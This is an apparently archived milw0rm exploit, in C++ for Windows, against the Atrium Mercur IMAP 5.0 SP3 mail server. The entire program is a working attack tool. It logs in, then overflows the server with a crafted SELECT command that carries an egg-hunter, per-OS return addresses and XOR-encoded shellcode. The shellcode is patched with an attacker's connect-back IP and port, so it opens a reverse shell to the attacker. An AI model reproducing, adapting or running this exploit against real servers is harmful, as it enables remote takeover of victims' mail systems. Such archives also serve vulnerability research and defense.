<html><head><title>Mercur Mailserver 5.0 SP3 (IMAP) Remote Buffer Overflow Exploit</title></head><pre>/*
 * mercur.cpp
 *
 * Atrium Mercur IMAP 5.0 SP3 Messaging Multiple IMAP Commands Remote Exploit
 * Copyright (C) 2006 Javaphile Group
 * http://www.javaphile.org
 *
 * Exploits code by : pll Ellison.Tang[at]gmail[dot]com
 *
 * Bug Reference:
 * http://www.frsirt.com/bulletins/4332
 *
 */

#include &lt;stdio.h&gt;
#include &lt;time.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;winsock2.h&gt;

#pragma comment(lib, &quot;ws2_32&quot;)

SOCKET ConnectTo(char *ip, int port)
{
	WSADATA	wsaData;
	SOCKET	s;
	struct	hostent		*he;
	struct	sockaddr_in	host;
	int		nTimeout=150000;

	if(WSAStartup(MAKEWORD(1,1),&amp;wsaData)!=0)
	{
		printf(&quot;[-]WSAStartup failed.\n&quot;);
		exit(-1);
	}

	if((he=gethostbyname(ip))==0)
	{
		printf(&quot;[-]Failed to resolve '%s'.&quot;, ip);
		exit(-1);
	}

	host.sin_port=htons(port);
	host.sin_family=AF_INET;
	host.sin_addr=*((struct in_addr *)he-&gt;h_addr);

	if ((s=socket(AF_INET,SOCK_STREAM,0))&lt;0)
	{
		printf(&quot;[-]Failed creating socket.&quot;);
 		exit(-1);
 	}

	if ((connect(s,(struct sockaddr *)&amp;host,sizeof(host)))==-1)
	{
		closesocket(s);
		printf(&quot;[-]Failed connecting to host.\n&quot;);
		exit(-1);
	}
	setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,(char*)&amp;nTimeout,sizeof(nTimeout));
	return s;
}


void Disconnect(SOCKET s)
{
	closesocket(s);
	WSACleanup();
}

void PrintSc(unsigned char *sc, int len)
{
    int    i,j;
    char *p;
    char msg[6];

    //printf(&quot;/* %d bytes */\n&quot;, buffsize);

    // Print general shellcode
    for(i = 0; i &lt; len; i++)
    {
        if((i%16)==0)
        {
            if(i!=0)
                printf(&quot;\&quot;\n\&quot;&quot;);
            else
                printf(&quot;\&quot;&quot;);
        }

        //printf(&quot;\\x%.2X&quot;, sc[i]);

        sprintf(msg, &quot;\\x%.2X&quot;, sc[i] &amp; 0xff);

        for( p = msg, j=0; j &lt; 4; p++, j++ )
        {
            if(isupper(*p))
                printf(&quot;%c&quot;, _tolower(*p));
            else
                printf(&quot;%c&quot;, p[0]);
        }
    }

    printf(&quot;\&quot;;\n&quot;);
}

void main(int argc,char* argv[])
{

	struct OSTYPE
	{
		unsigned int ret;
		char des[255];
	};

	OSTYPE os[] = {
		{0x7FFA4512, &quot;CN Windows ALL 0x7FFA4512&quot;},
		{0x7801f4fb, &quot;Windows 2k SP4 0x7801f4fb&quot;},
		{0xDDDDDDDD, &quot;Debug&quot;},
		{0, NULL}
	};

	unsigned char shellcode[]=
	/* ip offset: 71 + 21 = 92 */
	/* port offset: 78 + 21 = 99 */
	/* 21 bytes decode */
	&quot;\xeb\x0e\x5b\x4b\x33\xc9\xb1\xfe\x80\x34\x0b\xee\xe2\xfa\xeb\x05&quot;
	&quot;\xe8\xed\xff\xff\xff&quot;
	/* 254 bytes shellcode, xor with 0xee */
	&quot;\x07\x36\xee\xee\xee\xb1\x8a\x4f\xde\xee\xee\xee\x65\xae\xe2\x65&quot;
	&quot;\x9e\xf2\x43\x65\x86\xe6\x65\x19\x84\xea\xb7\x06\x96\xee\xee\xee&quot;
	&quot;\x0c\x17\x86\xdd\xdc\xee\xee\x86\x99\x9d\xdc\xb1\xba\x11\xf8\x7b&quot;
	&quot;\x84\xed\xb7\x06\x8e\xee\xee\xee\x0c\x17\xbf\xbf\xbf\xbf\x84\xef&quot;
	&quot;\x84\xec\x11\xb8\xfe\x7d\x86&quot;
	&quot;\x91\xee\xee\xef&quot;				//ip
	&quot;\x86&quot;
	&quot;\xec\xee&quot;
	&quot;\xee\xdb&quot;						//port
	&quot;\x65\x02\x84\xfe\xbb\xbd\x11\xb8\xfa\x6b\x2e\x9b\xd6\x65\x12\x84&quot;
	&quot;\xfc\xb7\x45\x0c\x13\x88\x29\xaa\xca\xd2\xef\xef\x7d\x45\x45\x45&quot;
	&quot;\x65\x12\x86\x8d\x83\x8a\xee\x65\x02\xbe\x63\xa9\xfe\xb9\xbe\xbf&quot;
	&quot;\xbf\xbf\x84\xef\xbf\xbf\xbb\xbf\x11\xb8\xea\x84\x11\x11\xd9\x11&quot;
	&quot;\xb8\xe2\x11\xb8\xf6\x11\xb8\xe6\xbf\xb8\x65\x9b\xd2\x65\x9a\xc0&quot;
	&quot;\x96\xed\x1b\xb8\x65\x98\xce\xed\x1b\xdd\x27\xa7\xaf\x43\xed\x2b&quot;
	&quot;\xdd\x35\xe1\x50\xfe\xd4\x38\x9a\xe6\x2f\x25\xe3\xed\x34\xae\x05&quot;
	&quot;\x1f\xd5\xf1\x9b\x09\xb0\x65\xb0\xca\xed\x33\x88\x65\xe2\xa5\x65&quot;
	&quot;\xb0\xf2\xed\x33\x65\xea\x65\xed\x2b\x45\xb0\xb7\x2d\x06\xcd\x11&quot;
	&quot;\x11\x11\x60\xa0\xe0\x02\x9c\x10\x5d\xf8\x01\x20\x0e\x8e\x43\x37&quot;
	&quot;\xeb\x20\x37\xe7\x1b\x43\x02\x17\x44\x8e\x09\x97\x28\x97&quot;;

	unsigned char FindSc[]=
	&quot;\x8B\xCC\x80\xE9\x3E\x8B\xF1\x33\xC0\x40\xC1\xE0\x0A\x04\x80\x8B&quot;
	&quot;\xF8\x57\x33\xC9\xB1\x3E\xF3\xA4\x5F\xFF\xE7\x8B\xC7\x04\x28\x50&quot;
	&quot;\x33\xC0\x50\x64\x89\x20\xBA\x41\x47\x4F\x55\x33\xFF\x3B\x17\x74&quot;
	&quot;\x03\x47\xEB\xF9\x83\xC7\x04\x3B\x17\x74\x03\x47\xEB\xEF\x83\xC7&quot;
	&quot;\x04\x57\xC3\x8B\x54\x24\x0C\x33\xC0\xB4\x10\x33\xDB\xB3\x9C\x01&quot;
	&quot;\x04\x13\x33\xC0\xC3&quot;
	&quot;\x90\x90\x90\x90&quot;
	&quot;\xEB\xA5&quot;;


	if(argc &lt; 5)
	{
		printf(&quot;Mercur IMAPD 5.0 SP3 Remote Exploit\n&quot;);
		printf(&quot;-------------------------------------------\n&quot;);
		printf(&quot;Usage:\n&quot;);
		printf(&quot;   %s &lt;Victim&gt; &lt;Connect back IP&gt; &lt;Connect back Port&gt; &lt;OsType&gt;\n&quot;, argv[0]);
		printf(&quot;\nType could be:\n&quot;);

		int i=0;
		while(os[i].ret)
		{
			printf(&quot; [%d]  %s\n&quot;, i, os[i].des);
			i++;
		}
		return;
	}

	SOCKET	s=ConnectTo(argv[1],143);

	printf(&quot;[+]Connected to target...&quot;);

	char szRecvBuff[600] = {0};

	if(recv(s,szRecvBuff,sizeof(szRecvBuff),0)&lt;=0)
	{
		printf(&quot;failed!\n&quot;);
		return;
	}
	else
	{
		printf(&quot;done!\n&quot;);
	}

//	printf(&quot;%s\n&quot;,szRecvBuff);

	if(strstr(szRecvBuff, &quot;MERCUR&quot;) == NULL)
	{
		printf(&quot;[-]Seems not IMAP running.\n&quot;);
		printf(&quot;Quiting...&quot;);
		return;
	}
	else
	{
		printf(&quot;[*]Seems IMAP running.\n&quot;);
	}

	unsigned long dwCbIp=inet_addr(argv[2]);

	unsigned short q=(unsigned short)atoi(argv[3]);
	unsigned short dwCbPort=(unsigned short)q;

	dwCbIp=dwCbIp^0xEEEEEEEE;
	dwCbPort=dwCbPort^0xEEEE;

	shellcode[92] =(char) (dwCbIp &amp; 0x000000FF);
	shellcode[93] =(char) ((dwCbIp &amp; 0x0000FF00)&gt;&gt;8);
	shellcode[94] =(char) ((dwCbIp &amp; 0x00FF0000)&gt;&gt;16);
	shellcode[95] =(char) ((dwCbIp &amp; 0xFF000000)&gt;&gt;24);

	shellcode[99] =(char) ((dwCbPort &amp; 0x0000FF00)&gt;&gt;8);
	shellcode[100] =(char) (dwCbPort &amp; 0x000000FF);

	char	szUserName[20]={0};
	printf(&quot;[?]Username:&quot;);
	gets(szUserName);

	char	szPassWord[20]={0};
	printf(&quot;[?]Passwd:&quot;);
	gets(szPassWord);

	char	szLogin[]=&quot; login &quot;;
	char	szLoginInfo[50]={0};
	unsigned char	szSpace=0x20;
	char szEnd[]=&quot;\r\n&quot;;

	memcpy(szLoginInfo,szUserName,lstrlen(szUserName));
	int		dwLen=lstrlen(szUserName);
	memcpy(szLoginInfo+dwLen,szLogin,lstrlen(szLogin));
	dwLen+=lstrlen(szLogin);
	memcpy(szLoginInfo+dwLen,szPassWord,lstrlen(szPassWord));
	dwLen+=lstrlen(szPassWord);
	memcpy(szLoginInfo+dwLen,&amp;szSpace,1);
	dwLen++;
	memcpy(szLoginInfo+dwLen,szPassWord,lstrlen(szPassWord));
	dwLen+=lstrlen(szPassWord);
	memcpy(szLoginInfo+dwLen,szEnd,lstrlen(szEnd));

//	printf(&quot;%s\n&quot;,szLoginInfo);

	printf(&quot;[+]Sending Login Info...&quot;);

	send(s,szLoginInfo,lstrlen(szLoginInfo),0);

	if(recv(s,szRecvBuff,sizeof(szRecvBuff),0)&lt;=0)
	{
		printf(&quot;failed!\n&quot;);
		return;
	}
	else
	{
		printf(&quot;done!\n&quot;);
	}

//	printf(&quot;%s\n&quot;,szRecvBuff);

	if(strstr(szRecvBuff, &quot;OK&quot;) == NULL)
	{
		printf(&quot;[-]Seems not a valid user or not support IMAP.\n&quot;);
		printf(&quot;Quiting...&quot;);
		return;
	}
	else
	{
		printf(&quot;[*]Seems a valid user.\n&quot;);
	}

	char	szSelect[]=&quot; select &quot;;
	char	szMagicData[1000]={0};

	memset(szMagicData,'A',sizeof(szMagicData)-1);
	memcpy(szMagicData,szUserName,lstrlen(szUserName));
	memcpy(szMagicData+lstrlen(szUserName),szSelect,sizeof szSelect-1);

	int p=atoi(argv[4]);
	*(unsigned int *)&amp;FindSc[85] = os[p].ret;

	memcpy(szMagicData+251-sizeof FindSc+1,FindSc,sizeof FindSc-1);

	memcpy(szMagicData+251,szEnd,sizeof szEnd-1);

	char	szAdog[]=&quot;AGOU&quot;;
	memcpy(szMagicData+253,szAdog,sizeof szAdog-1);
	memcpy(szMagicData+257,szAdog,sizeof szAdog-1);
	memcpy(szMagicData+261,shellcode,sizeof shellcode-1);

	memcpy(szMagicData+sizeof szMagicData-sizeof szEnd,szEnd,sizeof szEnd-1);

	printf(&quot;[+]Sending Magic Data To server...Good Luck!\n&quot;);
	send(s,szMagicData,sizeof szMagicData-1,0);

	recv(s,szRecvBuff,sizeof(szRecvBuff),0);
	printf(&quot;%s\n&quot;,szRecvBuff);

	Disconnect(s);
	printf(&quot;[?]Sending finished...Good luck!\n&quot;);
}

// milw0rm.com [2006-03-19]</pre></html>